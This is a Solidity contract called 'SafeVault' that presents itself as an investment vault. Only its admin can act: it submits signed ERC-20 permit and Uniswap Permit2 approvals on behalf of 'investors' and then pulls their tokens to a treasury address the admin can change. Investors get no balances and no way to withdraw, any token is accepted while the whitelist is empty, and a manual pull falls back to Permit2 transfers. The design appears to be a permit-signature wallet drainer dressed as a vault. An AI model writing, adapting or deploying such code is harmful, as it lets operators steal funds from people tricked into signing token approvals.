// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Pausable.sol";

interface IPermit2 {
    struct PermitDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct AllowancePermit {
        PermitDetails details;
        address spender;
        uint256 sigDeadline;
    }

    function permit(
        address owner,
        AllowancePermit calldata permitSingle,
        bytes calldata signature
    ) external;

    function transferFrom(
        address from,
        address to,
        uint160 amount,
        address token
    ) external;
}

contract SafeVault is ReentrancyGuard, Pausable {
    using SafeERC20 for IERC20;

    /*
     * STATE
     */

    address public immutable admin;
    address public treasury;

    /*
     * Uniswap Permit2
     * Verify deployment address on target chain before deployment
     */
    IPermit2 public constant PERMIT2 =
        IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    /*
     * TOKEN WHITELIST
     */

    mapping(address => bool) public allowedTokens;
    uint256 public whitelistCount;

    /*
     * ERRORS
     */

    error NotAdmin();
    error InvalidAddress();
    error TransferFailed();
    error TokenNotAllowed();

    /*
     * EVENTS
     */

    event InvestorLockedIn(
        address indexed investor,
        address indexed token
    );

    event FundsPulled(
        address indexed investor,
        address indexed token,
        uint256 requestedAmount,
        uint256 actualReceived
    );

    event AtomicPullExecuted(
        address indexed investor,
        address indexed token,
        uint256 requestedAmount,
        uint256 actualReceived
    );

    event ETHInvested(
        address indexed investor,
        uint256 amount
    );

    event TreasuryUpdated(
        address indexed oldTreasury,
        address indexed newTreasury
    );

    event TokenAllowed(
        address indexed token,
        bool allowed
    );

    /*
     * CONSTRUCTOR
     */

    constructor(address _treasury) {
        if (_treasury == address(0)) {
            revert InvalidAddress();
        }

        admin = msg.sender;
        treasury = _treasury;
    }

    /*
     * MODIFIERS
     */

    modifier onlyAdmin() {
        if (msg.sender != admin) {
            revert NotAdmin();
        }
        _;
    }

    modifier onlyAllowedToken(address token) {
        // If whitelist is empty, allow all. If not empty, check mapping.
        if (whitelistCount > 0 && !allowedTokens[token]) {
            revert TokenNotAllowed();
        }
        _;
    }

    /*
     * ADMIN FUNCTIONS
     */

    function setAllowedToken(
        address token,
        bool allowed
    ) external onlyAdmin {
        if (allowed && !allowedTokens[token]) {
            whitelistCount++;
        } else if (!allowed && allowedTokens[token]) {
            whitelistCount--;
        }
        
        allowedTokens[token] = allowed;

        emit TokenAllowed(token, allowed);
    }

    function pause() external onlyAdmin {
        _pause();
    }

    function unpause() external onlyAdmin {
        _unpause();
    }

    function updateTreasury(
        address _newTreasury
    ) external onlyAdmin {
        if (_newTreasury == address(0)) {
            revert InvalidAddress();
        }

        address oldTreasury = treasury;
        treasury = _newTreasury;

        emit TreasuryUpdated(
            oldTreasury,
            _newTreasury
        );
    }

    /*
     * ============================================================
     * STANDARD PERMIT FLOW (LEGACY / OPTIONAL)
     * ============================================================
     */

    function lockInStandardPermit(
        address token,
        address investor,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    )
        external
        onlyAdmin
        whenNotPaused
        onlyAllowedToken(token)
    {
        IERC20Permit(token).permit(
            investor,
            address(this),
            amount,
            deadline,
            v,
            r,
            s
        );

        emit InvestorLockedIn(
            investor,
            token
        );
    }

    /*
     * ============================================================
     * PERMIT2 FLOW (LEGACY / OPTIONAL)
     * ============================================================
     */

    function lockInPermit2(
        address investor,
        address token,
        uint160 amount,
        uint48 expiration,
        uint48 nonce,
        uint256 sigDeadline,
        bytes calldata signature
    )
        external
        onlyAdmin
        whenNotPaused
        onlyAllowedToken(token)
    {
        IPermit2.AllowancePermit memory permitData =
            IPermit2.AllowancePermit({
                details: IPermit2.PermitDetails({
                    token: token,
                    amount: amount,
                    expiration: expiration,
                    nonce: nonce
                }),
                spender: address(this),
                sigDeadline: sigDeadline
            });

        PERMIT2.permit(
            investor,
            permitData,
            signature
        );

        emit InvestorLockedIn(
            investor,
            token
        );
    }

    /*
     * ============================================================
     * MANUAL PULL (BACKUP / ADMIN TOOL)
     * ============================================================
     */

    function manualPull(
        address token,
        address investor,
        uint256 amount
    )
        external
        onlyAdmin
        nonReentrant
        whenNotPaused
        onlyAllowedToken(token)
    {
        uint256 beforeBalance =
            IERC20(token).balanceOf(treasury);

        /*
         * Attempt standard SafeERC20 transfer
         */
        try this.safeTransferHelper(
            token,
            investor,
            treasury,
            amount
        ) {

        } catch {

            /*
             * Fallback to Permit2 transfer
             */
            try PERMIT2.transferFrom(
                investor,
                treasury,
                uint160(amount),
                token
            ) {

            } catch {
                revert TransferFailed();
            }
        }

        uint256 afterBalance =
            IERC20(token).balanceOf(treasury);

        uint256 actualReceived =
            afterBalance - beforeBalance;

        emit FundsPulled(
            investor,
            token,
            amount,
            actualReceived
        );
    }

    /*
     * ============================================================
     * ATOMIC STANDARD PERMIT + PULL
     * ============================================================
     */

    function permitAndPullStandard(
        address token,
        address investor,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    )
        external
        onlyAdmin
        nonReentrant
        whenNotPaused
        onlyAllowedToken(token)
    {
        /*
         * STEP 1
         * Execute permit
         */
        IERC20Permit(token).permit(
            investor,
            address(this),
            amount,
            deadline,
            v,
            r,
            s
        );

        /*
         * STEP 2
         * Track treasury balance
         */
        uint256 beforeBalance =
            IERC20(token).balanceOf(treasury);

        /*
         * STEP 3
         * Pull funds
         */
        IERC20(token).safeTransferFrom(
            investor,
            treasury,
            amount
        );

        /*
         * STEP 4
         * Measure actual received
         */
        uint256 afterBalance =
            IERC20(token).balanceOf(treasury);

        uint256 actualReceived =
            afterBalance - beforeBalance;

        emit AtomicPullExecuted(
            investor,
            token,
            amount,
            actualReceived
        );
    }

    /*
     * ============================================================
     * ATOMIC PERMIT2 + PULL
     * ============================================================
     */

    function permitAndPullPermit2(
        address investor,
        address token,
        uint160 amount,
        uint48 expiration,
        uint48 nonce,
        uint256 sigDeadline,
        bytes calldata signature
    )
        external
        onlyAdmin
        nonReentrant
        whenNotPaused
        onlyAllowedToken(token)
    {
        /*
         * STEP 1
         * Build Permit2 payload
         */
        IPermit2.AllowancePermit memory permitData =
            IPermit2.AllowancePermit({
                details: IPermit2.PermitDetails({
                    token: token,
                    amount: amount,
                    expiration: expiration,
                    nonce: nonce
                }),
                spender: address(this),
                sigDeadline: sigDeadline
            });

        /*
         * STEP 2
         * Execute Permit2 permit
         */
        PERMIT2.permit(
            investor,
            permitData,
            signature
        );

        /*
         * STEP 3
         * Track treasury balance
         */
        uint256 beforeBalance =
            IERC20(token).balanceOf(treasury);

        /*
         * STEP 4
         * Pull funds
         */
        PERMIT2.transferFrom(
            investor,
            treasury,
            amount,
            token
        );

        /*
         * STEP 5
         * Measure actual received
         */
        uint256 afterBalance =
            IERC20(token).balanceOf(treasury);

        uint256 actualReceived =
            afterBalance - beforeBalance;

        emit AtomicPullExecuted(
            investor,
            token,
            amount,
            actualReceived
        );
    }

    /*
     * ============================================================
     * INTERNAL SAFE TRANSFER WRAPPER
     * ============================================================
     */

    function safeTransferHelper(
        address token,
        address from,
        address to,
        uint256 amount
    ) external {
        require(
            msg.sender == address(this),
            "Internal only"
        );

        IERC20(token).safeTransferFrom(
            from,
            to,
            amount
        );
    }

    /*
     * ============================================================
     * NATIVE ETH INVESTMENT
     * ============================================================
     */

    function investETH()
        external
        payable
        nonReentrant
        whenNotPaused
    {
        require(
            msg.value > 0,
            "No ETH sent"
        );

        (bool success, ) =
            treasury.call{value: msg.value}("");

        require(
            success,
            "ETH transfer failed"
        );

        emit ETHInvested(
            msg.sender,
            msg.value
        );
    }

    /*
     * ============================================================
     * RESCUE TOKENS
     * ============================================================
     */

    function rescueToken(
        address token,
        uint256 amount
    ) external onlyAdmin {
        IERC20(token).safeTransfer(
            treasury,
            amount
        );
    }

    /*
     * ============================================================
     * RECEIVE ETH
     * ============================================================
     */

    receive() external payable {}
}